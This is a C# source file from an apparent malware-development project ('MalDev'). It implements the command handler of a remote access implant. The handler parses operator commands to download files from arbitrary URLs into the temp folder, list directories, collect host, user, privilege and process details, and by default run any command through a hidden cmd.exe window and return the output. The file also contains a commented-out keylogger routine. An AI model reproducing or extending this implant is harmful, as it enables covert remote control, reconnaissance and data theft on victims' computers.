using System;
using System.Diagnostics;
using System.Net;
using System.Linq;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace MalDev
{
    class Operations
    {
        GeneralInfo ninstance = new GeneralInfo();

        public Operations(GeneralInfo instance)
        {
            ninstance = instance;
        }

        public string CommandParser(string cmd)
        {
            //download url ls ipconfig
            string command = "";
            string argument = "";
            if (cmd.Contains(" "))
            {
                command = cmd.Split(" ")[0];
                argument = cmd.Split(" ")[1];
            }
            else
            {
                command = cmd;
            }

            if (command.Contains("download"))
            {
                return DownloadFile(argument);
            }
            else if (command.Contains("cd"))
            {
                return SetWorkingDirectory(argument);
            }
            else if (command.Contains("ls"))
            {
                return EnumWorkingDirectory(argument);
            }
            else if (command.Contains("hostname"))
            {
                return GetHostName();
            }
            else if (command.Contains("osinfo"))
            {
                return GetOsInfo();
            }
            else if (command.Contains("username"))
            {
                return GetUserName();
            }
            else if (command.Contains("processinfo"))
            {
                return GetProcessInfo();
            }
            else if (command.Contains("pwd"))
            {
                return GetWorkingDirectory();
            }
            else if (command.Contains("ipaddress"))
            {
                return GetIpv4Address();
            }
            else if (command.Contains("privileges"))
            {
                return GetPrivileges();
            }
            else if (command.Contains("exepath"))
            {
                return GetExePath();
            }
            else
            {
                return ExecuteCMD(cmd);
            }
        }

        public string DownloadFile(string url)
        {
            try
            {
                System.Net.WebClient wInstance = new System.Net.WebClient();
                string tempPath = System.IO.Path.GetTempPath();
                string fileName = url.Split('/')[url.Split('/').Length - 1];
                string savePath = tempPath + fileName;

                wInstance.DownloadFile(url, savePath);
                return "File has been downloaded to: " + savePath;
            }
            catch (Exception e)
            {
                return e.Message.ToString();
            }
        }

        public string SetWorkingDirectory(string path)
        {
            try
            {
                System.IO.Directory.SetCurrentDirectory(path);
                return "Directory changed";
            }
            catch (Exception e)
            {
                return e.Message.ToString();
            }
        }

        public string EnumWorkingDirectory(string path)
        {
            try
            {
                if (path == "")
                {
                    path = ninstance.cDirectory;
                }

                System.Text.StringBuilder sbInstance = new System.Text.StringBuilder();


                var dirs = from line in System.IO.Directory.EnumerateDirectories(path) select line;

                foreach (var dir in dirs)
                {
                    sbInstance.Append(dir);
                    sbInstance.Append(Environment.NewLine);
                }
                // C:\Windows
                // C:\...
                //

                var files = from line in System.IO.Directory.EnumerateFiles(path) select line;

                foreach (var file in files)
                {
                    sbInstance.Append(file);
                    sbInstance.Append(Environment.NewLine);
                }


                string DirsAndFiles = sbInstance.ToString();


                return DirsAndFiles;
            }
            catch (Exception e)
            {
                return e.Message.ToString();
            }
        }

        public string ExecuteCMD(string command)
        {
            try
            {
                string results = "";

                System.Diagnostics.Process pInstance = new System.Diagnostics.Process();
                pInstance.StartInfo.FileName = "cmd.exe";
                pInstance.StartInfo.Arguments = "/c " + command;
                pInstance.StartInfo.UseShellExecute = false;
                pInstance.StartInfo.CreateNoWindow = true;
                pInstance.StartInfo.WorkingDirectory = ninstance.cDirectory;
                pInstance.StartInfo.RedirectStandardOutput = true;
                pInstance.StartInfo.RedirectStandardError = true;
                pInstance.Start();

                results += pInstance.StandardOutput.ReadToEnd();
                results += pInstance.StandardError.ReadToEnd();

                return results;
            }
            catch (Exception e)
            {
                return e.Message.ToString();
            }
        }

        public string GetHostName()
        {
            return ninstance.hostName;
        }

        public string GetUserName()
        {
            return ninstance.uName;
        }

        public string GetIpv4Address()
        {
            return ninstance.ipv4Address;
        }

        public string GetProcessInfo()
        {
            return ninstance.pName + " " + ninstance.pId;
        }

        public string GetPrivileges()
        {
            return ninstance.isAdmin.ToString();
        }

        public string GetWorkingDirectory()
        {
            return ninstance.cDirectory;
        }

        public string GetExePath()
        {
            return ninstance.ePath;
        }

        public string GetOsInfo()
        {
            return ninstance.oSystem;
        }
        
        // private void OnKeyPressed(object sender, KeyEventArgs e)
        // {
        //     string logFilePath = @"logs.txt";
        //     File.AppendAllText(logFilePath, e.KeyData.ToString() + Environment.NewLine);
        // }

    }
}